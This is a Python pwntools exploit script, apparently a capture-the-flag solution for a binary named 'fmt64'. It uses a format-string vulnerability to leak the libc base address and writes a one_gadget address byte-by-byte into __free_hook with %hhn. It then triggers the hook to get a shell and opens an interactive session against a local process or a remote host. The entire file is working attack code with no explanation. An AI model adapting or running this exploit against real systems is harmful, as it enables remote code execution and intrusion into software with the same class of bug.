#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './fmt64'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def leak_addr(pos):
    sl('LLLLLLLL%%%d$p'%(pos))
    return rc()[8:-1]

def show(addr):
    payload = "%10$s".ljust(24,'S')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_byte(addr,data):
    if data==0:
        payload = "%10$hhn"
    else:
        payload = "%%%dc%%10$hhn"%(data)
    payload = payload.ljust(24,'T')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_dw(addr,data):
    alter_byte(addr,data&0xff)
    alter_byte(addr+1,(data>>8)&0xff)
    alter_byte(addr+2,(data>>16)&0xff)
    alter_byte(addr+3,(data>>24)&0xff)

def alter_qw(addr,data):
    alter_dw(addr,data)
    alter_dw(addr+4,data>>32)

def flush(c='F'):
    sl(c*8+'\0'*0x80)
    rc()

# info
# elf, libc
ru('This\'s my mind!\n')

# leak libc base
if is_remote:
    offset___libc_start_main_ret = 0x20830
    offset_one_gadget = 0xf02a4  # execve("/bin/sh", rsp+0x50, environ)
if is_local:
    offset___libc_start_main_ret = 0x26b6b
    offset_one_gadget = 0x106ef8 # execve("/bin/sh", rsp+0x70, environ)

libc_base = int(leak_addr(46),16)-offset___libc_start_main_ret
info_addr('libc_base',libc_base)

free_hook = libc_base + libc.symbols['__free_hook']
info_addr('free_hook',free_hook)

one_gadget = libc_base + offset_one_gadget
info_addr('one_gadget',one_gadget)

log.success('write one_gadget to free_hook')
alter_qw(free_hook, one_gadget)

sl("%100000c")

p.interactive()
